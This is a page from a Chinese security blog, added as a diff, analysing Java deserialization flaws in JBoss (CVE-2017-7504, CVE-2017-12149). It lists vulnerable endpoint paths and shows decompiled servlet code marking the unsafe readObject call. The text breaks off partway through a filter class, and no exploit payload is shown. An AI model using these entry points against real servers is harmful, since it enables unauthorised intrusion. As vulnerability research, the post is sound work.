@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mayylu">
+
+
+
+    <meta name="description" content="学习是一种生活态度">
+
+
+
+<title>jboss 反序列化 | mayylu&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/vue.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">jboss 反序列化</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 11, 2024&nbsp;&nbsp;</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段时间挖edusrc的时候，在一个网段上发现weblogic，jboss,XXL-JOB等等java产品，所以博客才会更着这么勤，希望不是蜜罐吧<br> <span id="more"></span></p>
+<h2 id="JBoss的使用"><a href="#JBoss的使用" class="headerlink" title="JBoss的使用"></a>JBoss的使用</h2><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>Tomcat 是 JBoss 的一部分：在早期版本的 JBoss（现在的 WildFly）中，Tomcat 被用作其 Web 容器部分。也就是说，JBoss 使用 Tomcat 来处理 Servlet 和 JSP 的请求，但 JBoss 还提供了更多的企业级服务，如 EJB、JPA 等。<br>Tomcat + JBoss 组合：Tomcat 处理 HTTP 请求和 Web 层的服务，而 JBoss 提供更高层次的企业级功能。这种组合允许开发者在 Web 层和企业层之间进行分离。</p>
+<p>WildFly 是 JBoss AS 7 之后的名字：从 WildFly开始，Tomcat 不再是 WildFly 的主要 Web 容器。WildFly 有自己的 HTTP 子系统来处理 Web 请求。不过，Tomcat 仍然可以作为插件或外部组件来与 WildFly 集成使用。</p>
+<p>jboss支持完整 Java EE 规范的应用，相当于是一个功能集合<br>通过组合这些开源组件，可以基本实现大部分 JBoss 提供的功能：</p>
+<pre><code>数据访问层：使用 Hibernate。
+应用框架：使用 Spring。
+消息队列：使用 ActiveMQ 或其他 JMS 兼容的消息中间件。
+事务管理：使用 Atomikos 或 Narayana 进行分布式事务管理。
+Web 容器：使用 Tomcat 或 Jetty 来托管应用。
+安全性：使用 Spring Security 或 Keycloak 进行身份验证和授权。
+Web 服务：使用 JAX-RS 和 Jersey 来实现 RESTful 服务。
+微服务架构：使用 Spring Cloud 和 Kubernetes 来构建和部署微服务。
+</code></pre>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>其实漏洞的底层原理很简单，和之前的weblogic一样，Java EE应用程序之前需要通讯，如果存在序列化和反序列化通讯，并且反序列化时没有有效处理，就有可能存在漏洞</p>
+<p>简单看了下，基本都是java原生反序列化+http访问，下面就以找反序列化点+路由的方式分析漏洞</p>
+<h3 id="JBoss-AS-4-x"><a href="#JBoss-AS-4-x" class="headerlink" title="JBoss AS 4.x"></a>JBoss AS 4.x</h3><h4 id="CVE-2017-7504"><a href="#CVE-2017-7504" class="headerlink" title="CVE-2017-7504"></a>CVE-2017-7504</h4><p>存在漏洞的路径为：<code>/jbossmq-httpil/HTTPServerILServlet/*</code></p>
+<p>jbossmq-httpil.war 是一个与 JBoss MQ（消息队列）相关的 Web 应用归档（WAR）文件。它通常是 JBoss EAP（企业应用平台）的一部分，用于提供消息队列（JMS）服务的 HTTP 接口层。该文件的功能是将 JBoss MQ（一个消息中间件解决方案）通过 HTTP 协议暴露出来，从而允许客户端通过 HTTP 访问 JMS 消息队列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/server/all/deploy-hasingleton/jms/jbossmq-httpil.sar/jbossmq-httpil.war/jbossmq-httpil</span><br><span class="line"> ├── META-INF</span><br><span class="line"> │   └── MANIFEST.MF</span><br><span class="line"> └── WEB-INF</span><br><span class="line">     ├── classes</span><br><span class="line">     │   └── org</span><br><span class="line">     │       └── jboss</span><br><span class="line">     │           └── mq</span><br><span class="line">     │               └── il</span><br><span class="line">     │                   └── http</span><br><span class="line">     │                       └── servlet</span><br><span class="line">     │                           └── HTTPServerILServlet.class</span><br><span class="line">     ├── jboss-web.xml</span><br><span class="line">     └── web.xml</span><br></pre></td></tr></table></figure>
+
+<p>结构比较简单就是一个简单的war,而且就只有一个Servlet文件<br>web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HTTPServerILServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>JBossMQ HTTP-IL Servlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Provides and HTTP invocation layer for JBossMQ<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.jboss.mq.il.http.servlet.HTTPServerILServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>Invoker<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jboss.mq:service=Invoker<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HTTPServerILServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/HTTPServerILServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>HTTPServerILServlet.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jboss.mq.il.http.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HTTPServerILServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">       <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;doGet(HttpServletRequest &quot;</span> + request.toString() + <span class="string">&quot;, HttpServletResponse &quot;</span> + response.toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.getWriter().print(<span class="string">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;JBossMQ HTTP-IL Servlet&lt;/title&gt;&lt;head&gt;&lt;body&gt;&lt;h1&gt;This is the JBossMQ HTTP-IL&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;doPost() defers to processRequest, see the parameters in its trace.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.processRequest(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;processRequest(HttpServletRequest &quot;</span> + request.toString() + <span class="string">&quot;, HttpServletResponse &quot;</span> + response.toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/x-java-serialized-object; class=org.jboss.mq.il.http.HTTPILResponse&quot;</span>);</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(response.getOutputStream());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(request.getInputStream());</span><br><span class="line">            HTTPILRequest httpIlRequest = (HTTPILRequest)inputStream.readObject();<span class="comment">//反序列化点，最简单的一集</span></span><br><span class="line">            String methodName = httpIlRequest.getMethodName();</span><br><span class="line">            String clientIlId;</span><br><span class="line">            <span class="keyword">long</span> clientTime;</span><br><span class="line">            <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;clientListening&quot;</span>)) &#123;</span><br><span class="line">..............................................                </span><br></pre></td></tr></table></figure>
+
+<h3 id="JBoss-AS-6-x"><a href="#JBoss-AS-6-x" class="headerlink" title="JBoss AS 6.x"></a>JBoss AS 6.x</h3><h4 id="CVE-2017-12149"><a href="#CVE-2017-12149" class="headerlink" title="CVE-2017-12149"></a>CVE-2017-12149</h4><p>存在漏洞的路径为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/invoker/readonly/*</span><br><span class="line">/invoker/JMXInvokerServlet/*</span><br><span class="line">/invoker/EJBInvokerServlet/*</span><br><span class="line">/invoker/JMXInvokerHAServlet/*</span><br><span class="line">/invoker/EJBInvokerHAServlet/*</span><br><span class="line">/invoker/restricted/JMXInvokerServlet/* (需要登录)</span><br></pre></td></tr></table></figure>
+
+<p>同样也是war，而且war放置的位置也相似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">invoker</span><br><span class="line"> └── WEB-INF</span><br><span class="line">     ├── classes</span><br><span class="line">     │   └── org</span><br><span class="line">     │       └── jboss</span><br><span class="line">     │           └── invocation</span><br><span class="line">     │               └── http</span><br><span class="line">     │                   └── servlet</span><br><span class="line">     │                       ├── InvokerServlet$GetCredentialAction.class</span><br><span class="line">     │                       ├── InvokerServlet$GetPrincipalAction.class</span><br><span class="line">     │                       ├── InvokerServlet.class</span><br><span class="line">     │                       ├── NamingFactoryServlet.class</span><br><span class="line">     │                       └── ReadOnlyAccessFilter.class</span><br><span class="line">     ├── jboss-scanning.xml</span><br><span class="line">     ├── jboss-web.xml</span><br><span class="line">     └── web.xml</span><br></pre></td></tr></table></figure>
+
+<p>web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ReadOnlyAccessFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jboss.invocation.http.servlet.ReadOnlyAccessFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readOnlyContext<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>invokerName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jboss:service=NamingBeanImpl<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">description</span>&gt;</span>The JMX ObjectName of the naming service mbean</span><br><span class="line">         <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ReadOnlyAccessFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/readonly/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ### Servlets --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EJBInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.jboss.invocation.http.servlet.InvokerServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>invokerName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jboss:service=invoker,type=http<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">description</span>&gt;</span>The RMI/HTTP EJB compatible invoker<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EJBInvokerHAServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.jboss.invocation.http.servlet.InvokerServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>invokerName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jboss:service=invoker,type=httpHA<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">description</span>&gt;</span>The HA-RMI/HTTP EJB compatible invoker<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.jboss.invocation.http.servlet.InvokerServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ### Servlet Mappings --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EJBInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/EJBInvokerServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EJBInvokerHAServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/EJBInvokerHAServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/JMXInvokerServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/JMXInvokerHAServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/readonly/JMXInvokerServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/restricted/JMXInvokerServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>漏洞利用点可以分为两个ReadOnlyAccessFilter和InvokerServlet<br>ReadOnlyAccessFilter.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jboss.invocation.http.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadOnlyAccessFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpRequest = (HttpServletRequest)request;</span><br><span class="line">        Principal user = httpRequest.getUserPrincipal();</span><br><span class="line">        <span class="keyword">if</span> (user == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.readOnlyContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ServletInputStream sis = request.getInputStream();</span><br><span class="line">            